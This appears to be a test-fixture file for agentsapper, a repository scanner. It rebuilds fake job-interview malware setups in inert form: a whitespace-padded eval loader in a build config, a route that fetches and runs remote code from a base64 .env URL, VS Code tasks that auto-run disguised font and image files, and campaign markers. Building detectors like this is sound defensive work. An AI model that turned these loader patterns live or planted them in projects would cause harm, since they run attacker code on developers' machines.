import type { FixtureSpec } from '../spec.js';
import { lines } from './helpers.js';

// The shapes of fake job-interview repositories (2025-2026 reports): payloads that run
// on npm run dev or npm start, or when VS Code opens the folder. Everything here is
// inert: decoded payloads only log, and URLs use example.invalid. Tokens such as the
// dynamic-code calls and campaign markers are assembled from parts so this file does
// not trip agentsapper's own self-scan.

const TREND =
  'https://www.trendmicro.com/en_gb/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html';
const NVISO =
  'https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/';
const OSM =
  'https://opensourcemalware.com/blog/polinrider-dprk-compromised-hundreds-of-github-repos';

const EVAL = ['ev', 'al'].join('');
const FN = ['Func', 'tion'].join('');
const LOG_ONE = Buffer.from('console.log(1)').toString('base64');
const b64 = (text: string) => Buffer.from(text).toString('base64');

export const specs: FixtureSpec[] = [
  {
    id: 'code-001-padded-build-config',
    description:
      'A loader appended to postcss.config.mjs after a long run of spaces, so it is off-screen ' +
      'in an editor, decoding and running code when npm run dev loads the config.',
    kind: 'malicious',
    source: OSM,
    files: [
      {
        type: 'file',
        path: 'postcss.config.mjs',
        content: lines(
          'export default { plugins: { tailwindcss: {} } };',
          `${' '.repeat(400)}${EVAL}(atob('${LOG_ONE}'));`,
        ),
      },
      { type: 'file', path: 'package.json', content: '{ "scripts": { "dev": "next dev" } }\n' },
    ],
    expect: [{ ruleId: 'CODE-001', severity: 'critical', file: 'postcss.config.mjs', line: 2 }],
  },
  {
    id: 'code-002-003-backend-loader',
    description:
      'A server route that, on npm start, fetches code from a URL hidden in .env as base64 ' +
      'and runs it with a Function built around require; plus a weaker eval of a fetch.',
    kind: 'malicious',
    source: NVISO,
    files: [
      {
        type: 'file',
        path: '.env',
        content: lines('PORT=3000', `AUTH_API=${b64('https://json.example.invalid/b/1')}`),
      },
      {
        type: 'file',
        path: 'server/routes/api/auth.js',
        content: lines(
          "const axios = require('axios');",
          '(async () => {',
          "  const { data } = await axios.get(Buffer.from(process.env.AUTH_API, 'base64').toString());",
          `  new ${FN}('require', data)(require);`,
          '})();',
        ),
      },
      {
        type: 'file',
        path: 'src/telemetry.js',
        content: lines(
          'export function init(url) {',
          `  return fetch(url).then((r) => r.text()).then((t) => ${EVAL}(t));`,
          '}',
        ),
      },
    ],
    expect: [
      { ruleId: 'CODE-003', severity: 'medium', file: '.env', line: 2 },
      { ruleId: 'CODE-002', severity: 'high', file: 'server/routes/api/auth.js', line: 4 },
      { ruleId: 'CODE-002', severity: 'medium', file: 'src/telemetry.js', line: 2 },
    ],
  },
  {
    id: 'code-004-campaign-markers',
    description:
      'Literal markers of the loaders reported in hundreds of repositories, and the batch file ' +
      'that rewrites commit history to hide them.',
    kind: 'malicious',
    source: TREND,
    files: [
      {
        type: 'file',
        path: 'src/App.js',
        content: lines(
          'export default function App() { return null; }',
          `${['glo', "bal['!']"].join('')}='8-270-2';`,
        ),
      },
      { type: 'file', path: 'temp_auto_push.bat', content: 'rem not a script\r\n' },
    ],
    expect: [
      { ruleId: 'CODE-004', severity: 'critical', file: 'src/App.js', line: 2 },
      { ruleId: 'CODE-004', severity: 'critical', file: 'temp_auto_push.bat' },
    ],
  },
  {
    id: 'ide-003-fs-005-disguised-scripts',
    description:
      'A folder-open task and a launch config that run "font" and "image" files with node; ' +
      'the files are script text behind a font or image extension.',
    kind: 'malicious',
    source: TREND,
    files: [
      {
        type: 'file',
        path: '.vscode/tasks.json',
        content: lines(
          '{',
          '  "version": "2.0.0",',
          '  "tasks": [',
          '    {',
          '      "label": "fonts",',
          '      "type": "shell",',
          '      "command": "node public/fonts/fa-brands-regular.woff2",',
          '      "runOptions": { "runOn": "folderOpen" }',
          '    }',
          '  ]',
          '}',
        ),
      },
      {
        type: 'file',
        path: '.vscode/launch.json',
        content: lines(
          '{',
          '  "configurations": [',
          '    {',
          '      "type": "node",',
          '      "request": "launch",',
          '      "program": "${workspaceFolder}/public/img/logo.png"',
          '    }',
          '  ]',
          '}',
        ),
      },
      {
        type: 'file',
        path: 'public/fonts/fa-brands-regular.woff2',
        content: "const m = require('os');\nconsole.log(m.platform());\n",
      },
      {
        type: 'file',
        path: 'public/img/logo.png',
        content: 'module.exports = () => console.log(1);\n',
      },
      { type: 'file', path: '.vscode/spellright.dict', content: `const x = 1;\n${EVAL}(x);\n` },
    ],
    expect: [
      { ruleId: 'IDE-001', severity: 'high', file: '.vscode/tasks.json', line: 8 },
      { ruleId: 'IDE-003', severity: 'critical', file: '.vscode/tasks.json', line: 7 },
      { ruleId: 'IDE-003', severity: 'high', file: '.vscode/launch.json', line: 6 },
      { ruleId: 'FS-005', severity: 'high', file: 'public/fonts/fa-brands-regular.woff2' },
      { ruleId: 'FS-005', severity: 'high', file: 'public/img/logo.png' },
      { ruleId: 'FS-005', severity: 'high', file: '.vscode/spellright.dict' },
    ],
  },
  {
    id: 'benign-interview-shapes',
    description:
      'Ordinary projects with the same files: configs that run git or require plugins, real ' +
      'font and image bytes, a word list, a base64 secret, and loaders inside node_modules and dist.',
    kind: 'benign',
    files: [
      {
        type: 'file',
        path: 'next.config.js',
        content: lines(
          "const { execSync } = require('child_process');",
          "const sha = execSync('git rev-parse HEAD').toString().trim();",
          'module.exports = { env: { SHA: sha }, images: { domains: ["cdn.example.invalid"] } };',
        ),
      },
      {
        type: 'file',
        path: 'tailwind.config.js',
        content:
          "module.exports = { content: ['./src/**/*.tsx'], plugins: [require('@tailwindcss/forms')] };\n",
      },
      {
        type: 'file',
        path: 'public/fonts/inter.woff2',
        encoding: 'base64',
        content: Buffer.concat([Buffer.from('wOF2'), Buffer.alloc(60, 7)]).toString('base64'),
      },
      {
        type: 'file',
        path: 'public/logo.png',
        encoding: 'base64',
        content: Buffer.concat([
          Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
          Buffer.alloc(40),
        ]).toString('base64'),
      },
      {
        type: 'file',
        path: '.vscode/spellright.dict',
        content: 'agentsapper\nfsmonitor\nTypeScript\n',
      },
      {
        type: 'file',
        path: '.env',
        content: lines('SESSION_SECRET=c2VjcmV0LXZhbHVlLW5vdC1hLXVybA==', 'DEBUG=false'),
      },
      {
        type: 'file',
        path: 'node_modules/pkg/index.js',
        content: `new ${FN}('require', x)(require);\n`,
      },
      { type: 'file', path: 'dist/app.js', content: `${['glo', "bal['!']"].join('')}=1;\n` },
      {
        type: 'file',
        path: 'src/server.js',
        content: "const r = await fetch('/api'); console.log(await r.json());\n",
      },
    ],
    expect: [],
  },
];
